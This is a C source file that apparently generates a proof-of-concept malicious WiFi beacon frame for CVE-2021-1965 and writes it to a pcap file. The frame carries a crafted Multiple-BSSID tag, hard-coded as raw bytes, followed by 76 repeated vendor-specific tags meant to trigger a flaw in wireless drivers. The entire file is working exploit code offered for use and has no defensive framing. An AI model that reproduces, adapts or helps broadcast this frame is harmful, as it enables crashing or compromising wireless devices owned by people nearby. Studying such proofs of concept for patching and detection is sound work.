#include <libwifi.h>

#include <pcap.h>

#include <bits/types/struct_timeval.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>

pcap_dumper_t *filedumper = NULL;

struct mbssid_tag {
    uint8_t max_indicator;
    uint8_t sub_id;
    uint8_t sub_len;
    uint8_t sub_info[252];
};

void create_write_beacon() {
    // Define basic Beacon Frame
    printf("[*] Creating Beacon Frame\n");
    struct libwifi_beacon beacon = {0};
    unsigned char transmitter[6] = {0};

    // Random Transmitter + Braodcast Destination
    libwifi_random_mac(transmitter, NULL);
    unsigned char receiver[6] = "\xFF\xFF\xFF\xFF\xFF\xFF";

    // Create basic beacon (ssid + channel)
    libwifi_create_beacon(&beacon, receiver, transmitter, transmitter, "CVE-2021-1965", 6);

    // Create MBSSID tag
    uint8_t sub_info[] = {   0x53,0x02,0x11,0x15,0x00,0x13,0x72,0x6f,0x75,0x74,0x65 \
                            ,0x72,0x2d,0x33,0x34,0x31,0x31,0x2d,0x6e,0x61,0x74,0x65,0x2d,0x36,0x67,0x55,0x03 \
                            ,0x0f,0x01,0x00,0x30,0x14,0x01,0x00,0x00,0x0f,0xac,0x04,0x01,0x00,0x00,0x0f,0xac \
                            ,0x04,0x01,0x00,0x00,0x0f,0xac,0x08,0xcc,0x00,0x7f,0x0b,0x04,0x00,0x4f,0x02,0x00 \
                            ,0x00,0x00,0x40,0x00,0x40,0x08,0xdd,0x17,0x8c,0xfd,0xf0,0x01,0x01,0x02,0x01,0x00 \
                            ,0x02,0x01,0x01,0x03,0x03,0x01,0x01,0x00,0x04,0x01,0x01,0x09,0x02,0x0f,0x03,0xdd \
                            ,0x18,0x00,0x50,0xf2,0x02,0x01,0x01,0x80,0x00,0x03,0xa4,0x00,0x00,0x27,0xa4,0x00 \
                            ,0x00,0x42,0x43,0x5e,0x00,0x62,0x32,0x2f,0x00,0xdd,0x16,0x8c,0xfd,0xf0,0x04,0x00 \
                            ,0x00,0x49,0x4c,0x51,0x03,0x02,0x09,0x72,0x01,0xcb,0x17,0x00,0x00,0x04,0x11,0x00 \
                            ,0x00,0xdd,0x07,0x8c,0xfd,0xf0,0x04,0x01,0x01,0x01};
    size_t mbssid_tag_len = sizeof(struct mbssid_tag) + sizeof(sub_info) + 4;
    struct mbssid_tag *mbssid = malloc(mbssid_tag_len);
    if (mbssid == NULL) {
        fprintf(stderr, "[!] Couldn't allocate struct for mbssid_tag.\n");
        exit(EXIT_FAILURE);
    }
    memset(mbssid, 0, mbssid_tag_len);
    mbssid->max_indicator = 4;
    mbssid->sub_id = 0;
    mbssid->sub_len = sizeof(sub_info);
    memcpy(mbssid->sub_info, sub_info, sizeof(sub_info));

    // Add MBSSID to frame
    libwifi_quick_add_tag(&beacon.tags, TAG_MULTIPLE_BSSID, (const unsigned char *)mbssid, mbssid_tag_len);

    // Add a bunch of Vendor Specific tags (original poc does it 76 times)
    struct libwifi_tag_vendor_header *vendor_header = malloc(sizeof(struct libwifi_tag_vendor_header));
    memcpy(&vendor_header->oui, "\x00\x0c\xe7", 3); //mediatek? lol
    vendor_header->type = 8;

    size_t vendor_tag_len = (sizeof(struct libwifi_tag_vendor_header) + 4);
    unsigned char *vendor_tag = malloc(vendor_tag_len);
    memcpy(vendor_tag, vendor_header, sizeof(struct libwifi_tag_vendor_header));
    memcpy(vendor_tag + sizeof(struct libwifi_tag_vendor_header), "\x08\x00\x00\x00", 4);

    for (int i = 0; i < 76; i++) {
        libwifi_quick_add_tag(&beacon.tags, TAG_VENDOR_SPECIFIC, vendor_tag, vendor_tag_len);
    }

    // Write full frame bytes to buffer
    unsigned char *buf = NULL;
    size_t buf_len = libwifi_get_beacon_length(&beacon);
    buf = malloc(buf_len);
    if (buf == NULL) {
        fprintf(stderr, "[!] Couldn't allocate buffer for beacon dump.\n");
        exit(EXIT_FAILURE);
    }
    memset(buf, 0, buf_len);
    libwifi_dump_beacon(&beacon, buf, buf_len);

    printf("[*] Writing Beacon Frame to pcap\n");
    struct pcap_pkthdr pkt_hdr = {0};
    struct timeval tv = {0};
    pkt_hdr.caplen = buf_len;
    pkt_hdr.len = buf_len;
    gettimeofday(&tv, NULL);
    pkt_hdr.ts = tv;
    pcap_dump((unsigned char *) filedumper, &pkt_hdr, buf);
}

void helpexit() {
    fprintf(stderr, "[!] Usage: ./generate_beacon --file <file.pcap>\n");
    exit(EXIT_FAILURE);
}

int main(int argc, char **argv) {
    pcap_t *handle = NULL;
    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    FILE *pcapfile = NULL;

    if (argc < 2) {
        helpexit();
    }
    if (strcmp(argv[1], "--file") == 0) {
        pcapfile = fopen(argv[2], "w+");
        if ((handle = pcap_open_dead(DLT_IEEE802_11, BUFSIZ)) == NULL) {
            fprintf(stderr, "[!] Error opening dead capture (%s)\n", errbuf);
            exit(EXIT_FAILURE);
        }
        if ((filedumper = pcap_dump_fopen(handle, pcapfile)) == NULL) {
            fprintf(stderr, "[!] Error opening file %s (%s)\n", argv[2], errbuf);
            exit(EXIT_FAILURE);
        }
    } else {
        helpexit();
    }

    printf("[+] Setup Complete\n");

    create_write_beacon();

    pcap_dump_close(filedumper);
    pcap_close(handle);
    return 0;
}
